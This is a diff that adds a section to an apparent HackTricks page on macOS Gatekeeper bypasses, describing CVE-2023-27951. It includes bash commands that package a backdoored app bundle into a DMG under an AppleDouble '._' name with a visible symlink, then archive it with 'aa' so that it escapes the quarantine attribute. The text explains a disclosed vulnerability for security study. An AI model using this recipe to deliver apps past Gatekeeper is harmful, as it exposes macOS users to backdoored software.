@@ -323,6 +323,41 @@ Check the [**original report**](https://www.microsoft.com/en-us/security/blog/20
 
 It was discovered that **Google Chrome wasn't setting the quarantine attribute** to downloaded files because of some macOS internal problems.
 
+### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)
+
+AppleDouble file formats store the attributes of a file in a separate file starting by `._`, this helps to copy dile attributes **across macOS machines**. However, it was noticed that after decompressing an AppleDouble file, the file starting with `._` **wasn't given the quarantine attribute**.
+
+{% code overflow="wrap" %}
+```bash
+mkdir test
+echo a > test/a
+echo b > test/b
+echo ._a > test/._a
+aa archive -d test/ -o test.aar
+
+# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
+```
+{% endcode %}
+
+Being able to create a file that won't have the quarantine attribute set, it was **possible to bypass Gatekeeper.** The trick was to **create a DMG file application** using the AppleDouble name convention (start it with `._`) and create a **visible file as a sym link to this hidden** file without the quarantine attribute.\
+When the **dmg file is executed**, as it doesn't have a quarantine attribute it'll **bypass Gatekeeper**.
+
+```bash
+# Create an app bundle with the backdoor an call it app.app
+
+echo "[+] creating disk image with app"
+hdiutil create -srcfolder app.app app.dmg
+
+echo "[+] creating directory and files"
+mkdir 
+mkdir -p s/app
+cp app.dmg s/app/._app.dmg
+ln -s ._app.dmg s/app/app.dmg
+
+echo "[+] compressing files"
+aa archive -d s/ -o app.aar
+```
+
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
